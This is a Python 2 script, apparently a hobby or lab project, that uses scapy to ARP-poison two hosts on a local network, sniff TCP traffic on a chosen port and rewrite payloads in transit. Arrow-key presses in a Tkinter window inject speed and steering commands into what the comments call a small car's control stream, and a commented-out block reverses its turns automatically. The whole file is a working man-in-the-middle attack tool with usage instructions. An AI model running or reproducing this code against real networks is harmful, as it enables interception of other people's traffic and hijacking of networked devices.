#!/usr/bin/python
# coding=utf-8
from tkinter import *
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import threading
import signal
from scapy.all import *
from scapy.layers.inet import *
import sys
import getopt
import os
import uuid
import struct

__author__ = 'Edward'
# 监听的网卡
interface = "en0"
# 被攻击的IP
victimIP = ""

# 被攻击的Mac
victimMAC = ""
# 本机需要伪装的IP
targetIP = ""
# 本机要伪装的MAC
targetMAC = ""

# 本机MAC地址
myMAC = ""

port = 0
packet_count = 0

restored = False
char = u'\u0000'
currentVelStr = '\x32\x00\x00\x00'

mutex = threading.Lock()


def usage():
    print "usage: python arpspoof.py -h"
    print "usage: python arpspoof.py --help"
    print "usage: python arpspoof.py -i en0 -t 192.168.1.1 -v 192.168.1.2 -n 10 -p 80"
    print "usage: python arpspoof.py --interface en0 --target 192.168.1.1 --victim 192.168.1.2 --number 10 --port 80"
    sys.exit(0)


# 获取ip地址对应的Mac地址
# srp运行在第二层，所以能发MAC帧
# send运行再第三层，能发送IP包和ARP包
def getMAC(ipAddress):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ipAddress), timeout=2, retry=10)
    for s, r in responses:
        return r[Ether].src
    return None


def GetLocalMac():
    """
    get the local mathine`s mac address
    """
    hwaddress = uuid.uuid1().hex[-12:]
    p = re.compile(r'([0-9a-fA-F]{2})')
    return p.subn(r'\1:', hwaddress)[0][:-1]


##############
# ARP poison #
##############

def poisonSomebody(targetIP, targetMAC, victimIP, victimMAC):
    global myMAC
    print "[*] thread %s is running" % threading.current_thread().name

    # 告诉受害者我的MAC绑定到了伪装主机的IP
    ARPPoisonPacketToVictim = ARP()
    ARPPoisonPacketToVictim.op = "is-at"
    ARPPoisonPacketToVictim.psrc = targetIP
    ARPPoisonPacketToVictim.pdst = victimIP
    ARPPoisonPacketToVictim.hwdst = victimMAC
    # ARPPoisonPacketToVictim.hwsrc = myMAC
    # 而其中的MAC src地址默认就成了本机的MAC地址，完成对受害者的污染

    # 告诉伪装主机我的MAC绑定到了受害者的IP
    ARPPoisonPacketToTarget = ARP()
    ARPPoisonPacketToTarget.op = "is-at"
    ARPPoisonPacketToTarget.psrc = victimIP
    ARPPoisonPacketToTarget.pdst = targetIP
    ARPPoisonPacketToTarget.hwdst = targetMAC
    # ARPPoisonPacketToTarget.hwsrc = myMAC
    # 而其中的MAC src地址默认成了本机的MAC地址，完成对被伪装主机的污染

    print "[*] Beginning ARP poison [CTRL + C to stop]"

    while True:
        try:
            send(ARPPoisonPacketToTarget)
            send(ARPPoisonPacketToVictim)
            time.sleep(1)
        except KeyboardInterrupt:
            print "[*] ARP posion attack finished!"
            print "thread %s is ended" % threading.current_thread().name
            restoreNetwork(targetIP, targetMAC, victimIP, victimMAC)

    # print "[*] ARP posion attack finished!"
    # print "thread %s is ended" % threading.current_thread().name
    return


###################
# restore network #
###################

def restoreNetwork(targetIP, targetMAC, victimIP, victimMAC):
    global restored
    if not restored:
        restored = True
        print "[*] Restoring Network..."
        # To victim
        send(ARP(op="is-at", psrc=targetIP, pdst=victimIP, hwsrc=targetMAC, hwdst="ff:ff:ff:ff:ff:ff"), count=5)
        # To target
        send(ARP(op="is-at", psrc=victimIP, pdst=targetIP, hwsrc=victimMAC, hwdst="ff:ff:ff:ff:ff:ff"), count=5)

        print "[*] Restoring Network Success!!!"
        # 会向主进程发出一个SIGINT信号，该信号等同于CTRL+C
        os.kill(os.getpid(), signal.SIGINT)
    else:
        pass


#######################
# 数据包回调函数        #
#######################

###
# 1. 截获数据包 DONE
# 2. 创建16bit的16进制串与方向键的映射 DONE
# 3. 若该数据包含有IP部分 DONE
# 3.1 对数据包的TCP部分进行解析，并且修改TCP中的载荷 DONE
# 3.2 修改TCP的载荷之后要随之对TCP头部中的校验和进行重新计算，不然是废的 DONE
# 4. 修改MAC帧的物理地址，使其能够正确发送到正确的主机，转发数据包 DONE
###

def pktCallback(packet):
    global targetIP
    global targetMAC
    global victimIP
    global victimMAC
    global myMAC
    global port
    global char
    global mutex
    global currentVelStr

    # changed = False

    # key_dict = {"\x00\x01": "Key Up", "\x01\x01": "Key Down", "\x02\x01": "Key Left", "\x03\x01": "Key Right"}
    key_dict = {u'\uf700': '\x01\x00\x00\x01', # 上 0.5m/s
                u'\uf701': '\x01\x00\x01\x01', # 下 -0.5m/s
                u'\uf702': '\x04\x00\x02\x01\x5A\x00\x00\x00', # 左 从前进后退的指令，强制左右转会出现立即转向的情况，问题在于我要设置小车在多少距离后转向。
                u'\uf703': '\x04\x00\x03\x01\xA6\xFF\xFF\xFF'  # 右 这个问题的话就是这个字段后的8字节里的值为多少了
                }
    stepVel = 50
    if packet.haslayer(IP):
        # print "I have IP part!"
        if packet.haslayer(TCP):
            # print "I have TCP part"
            # packet.show()
            # print "Show1 End"
            # 首先数据包不是我发出的，且是发给我的
            # 其次数据包的源端口或者目标端口是9999（指定的）
            if (packet[Ether].src != myMAC and packet[Ether].dst == myMAC) and (packet[TCP].sport == port or packet[TCP].dport == port):
                if packet[TCP].payload:
                    # print "sport : %d ==> dport : %d" % (packet[TCP].sport, packet[TCP].dport)
                    # packet.show()
                    # 原有的载荷字符串
                    packet_payload = str(packet[TCP].payload)
                    # 若收到的信息是GENERIC的，那么获取其中的速度值
                    if packet_payload[4:6] == '\x01\x00':
                        # while len(currentVelStr) != 4:
                        currentVelStr = packet_payload[8:12]
                        print "Current Vel is %d." % struct.unpack('i', currentVelStr)

                    # print packet_payload.encode('hex')
                    # print
                    # 修改的载荷字符串
                    new_payload = ""

                    # 获取键盘输入，将对应的值装入新的载荷中
                    # 称为对char变量的消费者，这段带码会读取char的值，然后对应的将payload中第5位起的数据修改为对应的值
                    # 随后将char置空，消费掉char
                    if mutex.acquire(1):
                        if char in (u'\uf700', u'\uf701', u'\uf702', u'\uf703'):
                            # print "%r" % char
                            # new_payload = ""
                            if char in (u'\uf700', u'\uf701'):
                                # 将字节流转成整数，为速度值
                                vel = struct.unpack('i', currentVelStr)[0]
                                # 根据获得的键值改变速度的大小
                                if char == u'\uf700':
                                    vel += stepVel
                                elif char == u'\uf701':
                                    vel -= stepVel
                                else:
                                    pass
                                # 将速度转为字节流
                                tmp = struct.pack('i', vel)

                                new_payload = packet_payload[:4] + key_dict[char] + tmp + packet_payload[12:]
                            elif char in (u'\uf702', u'\uf703'):
                                tmp = struct.pack('d', 100.0)
                                new_payload = packet_payload[:4] + key_dict[char] + tmp + packet_payload[20:]
                                # time.sleep(2.5)
                            else:
                                pass

                            # new_payload = packet_payload[:4] + key_dict[char] + packet_payload[12:]
                            print packet_payload.encode('hex')
                            print new_payload.encode('hex')
                            print
                        else:
                            new_payload = packet_payload
                        char = u'\u0000'
                        mutex.release()

                    # 在packet中添加新载荷，并修改TCP头部校验和
                    packet[TCP].payload = new_payload
                    del packet[TCP].chksum
                    packet[TCP] = TCP(str(packet[TCP]))

                    '''
                    # 这一段是自动进行数据包修改的代码
                    # 根据原始载荷第五个字节的值type来判断这个数据包的类型，是加减速的命令还是转向命令
                    if packet_payload[4] == '\x01':
                        print key_dict[packet_payload[6:8]]
                    elif packet_payload[4] == '\x04':
                        # 只有左右转向的命令需要对数据包进行修改
                        # print key_dict[packet_payload[6:8]]
                        # 若是转向命令的话，让转的方向相反，修改形成新的载荷
                        if packet_payload[6:8] == '\x02\x01':
                            new_payload = packet_payload[0:6] + '\x03\x01\xA6\xFF\xFF\xFF' + packet_payload[12:]
                        elif packet_payload[6:8] == '\x03\x01':
                            new_payload = packet_payload[0:6] + '\x02\x01\x5A\x00\x00\x00' + packet_payload[12:]
                        else:
                            pass
                        # 将新的载荷填充到数据包种
                        packet[TCP].payload = new_payload
                        # hexdump(packet[inet.TCP].payload)
                        # 修改校验和
                        del packet[TCP].chksum
                        packet[TCP] = TCP(str(packet[TCP]))
                        # packet[inet.TCP].show()
                        # changed = True
                    else:
                        pass
                    '''

        if packet[Ether].dst == myMAC:
            if packet[IP].dst == targetIP:
                packet[Ether].src = packet[Ether].dst
                packet[Ether].dst = targetMAC
            elif packet[IP].dst == victimIP:
                packet[Ether].src = packet[Ether].dst
                packet[Ether].dst = victimMAC
            else:
                pass

        # if changed:
        #     print "Changed!"
        #     packet.show()
        # print "==============Copy!!!!====================="
        new_ether = Ether(src=packet[Ether].src, dst=packet[Ether].dst)
        new_ip = IP(version=packet[IP].version, ihl=packet[IP].ihl, tos=packet[IP].tos, len=packet[IP].len,
                    id=packet[IP].id, flags=packet[IP].flags, frag=packet[IP].frag, ttl=packet[IP].ttl,
                    proto=packet[IP].proto, chksum=packet[IP].chksum, src=packet[IP].src, dst=packet[IP].dst,
                    options=packet[IP].options)

        if packet.haslayer(TCP):
            new_tcp = TCP(sport=packet[TCP].sport, dport=packet[TCP].dport, seq=packet[TCP].seq, ack=packet[TCP].ack,
                          dataofs=packet[TCP].dataofs, reserved=packet[TCP].reserved, flags=packet[TCP].flags,
                          window=packet[TCP].window, chksum=packet[TCP].chksum, urgptr=packet[TCP].urgptr,
                          options=packet[TCP].options)
            if packet.haslayer(Raw):
                new_raw = Raw(load=packet[Raw].load)
                new_packet = new_ether / new_ip / new_tcp / new_raw
            else:
                new_packet = new_ether / new_ip / new_tcp
        else:
            new_packet = new_ether / new_ip
        # new_packet.show()

        sendp(new_packet)


# 嗅探线程，该线程对流经本机的流量进行截获，修改再发出
def sniffer(pkt_callback, bpf_filter, interf, packet_count):
    if packet_count == 0:
        sniff(prn=pkt_callback, filter=bpf_filter, iface=interf)
    else:
        sniff(prn=pkt_callback, count=packet_count, filter=bpf_filter, iface=interf, store=0)


# GUI的键盘事件监听程序，通过获取键盘事件的值，设置char这个变量，供嗅探线程中的回调函数读取
# 记得这个设置char变量需要使用互斥锁，即设置char变量时其他线程无法对char的值进行修改
def print_key(event):
    global char
    global mutex
    if mutex.acquire(1):
        if event.char in (u'\uf700', u'\uf701', u'\uf702', u'\uf703'):
            char = event.char
            print "I got a key : %r" % char
        mutex.release()


def main():
    global interface
    global targetIP
    global targetMAC
    global victimIP
    global victimMAC
    global myMAC
    global port
    global packet_count

    if not len(sys.argv[1:]):
        usage()

    ##读取命令行选项
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hi:n:p:t:v:",
                                   ["help", "interface", "number", "port", "target", "victim"])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-i", "--interface"):
            interface = a
        elif o in ("-t", "--target"):
            targetIP = a
        elif o in ("-v", "--victim"):
            victimIP = a
        elif o in ("-p", "--port"):
            port = int(a)
        elif o in ("-n", "--number"):
            packet_count = int(a)
        else:
            assert False, "Unhandled Option"

    print "[*] Eth is %s" % interface

    print "[*] The Number of Packets is %d" % packet_count

    if targetIP == "":
        usage()
    else:
        print "[*] Target IP is %s" % targetIP

    if victimIP == "":
        usage()
    else:
        print "[*] Victim IP is %s" % victimIP

    if port == 0:
        usage()
    else:
        print "[*] Scan Port is %d" % port

    # 设置嗅探的网卡
    conf.iface = interface

    # 关闭输出
    conf.verb = 0

    print "[*] Setting up %s" % interface

    # 被伪装的目标MAC地址
    targetMAC = getMAC(targetIP)

    if targetMAC is None:
        print "[WARNING!!!] Failed to get target MAC,exiting"
        sys.exit(0)
    else:
        print "[*] Target %s is at %s" % (targetIP, targetMAC)

    # 受害者的MAC地址
    victimMAC = getMAC(victimIP)

    if victimMAC is None:
        print "[WARNING!!!] Failed to get victim MAC,exiting"
        sys.exit(0)
    else:
        print "[*] Victim %s is at %s" % (victimIP, victimMAC)

    myMAC = GetLocalMac()

    if myMAC is None:
        print "[WARNING!!!] Failed to get my MAC,exiting"
        sys.exit(0)
    else:
        print "[*] My MAC is at %s" % myMAC

    # 启动ARP Poison线程
    poison_thread = threading.Thread(name="ARPPoisonThread", target=poisonSomebody, args=(targetIP, targetMAC, victimIP, victimMAC))
    poison_thread.setDaemon(True)
    poison_thread.start()

    try:
        if packet_count == 0:
            print "[*] Starting Sniffer for packets to IP:%s" % victimIP
        else:
            print "[*] Starting Sniffer for %d packets to IP:%s" % (packet_count, victimIP)

        bpf_filter = "ip host %s" % victimIP

        # 先将嗅探改包的代码改成一段子线程，作为守护进程运行起来
        sniff_thread = threading.Thread(name="SnifferThread", target=sniffer, args=(pktCallback, bpf_filter, interface, packet_count))

        sniff_thread.setDaemon(True)

        sniff_thread.start()

        tk = Tk()

        entry = Entry(tk)

        # 绑定事件监听函数，对按键进行监听
        entry.bind('<Key>', print_key)

        entry.pack()

        tk.mainloop()

        restoreNetwork(targetIP, targetMAC, victimIP, victimMAC)
    except KeyboardInterrupt:
        restoreNetwork(targetIP, targetMAC, victimIP, victimMAC)
        print "ARPSpoof ended!"
        sys.exit(0)
        # exit()


main()
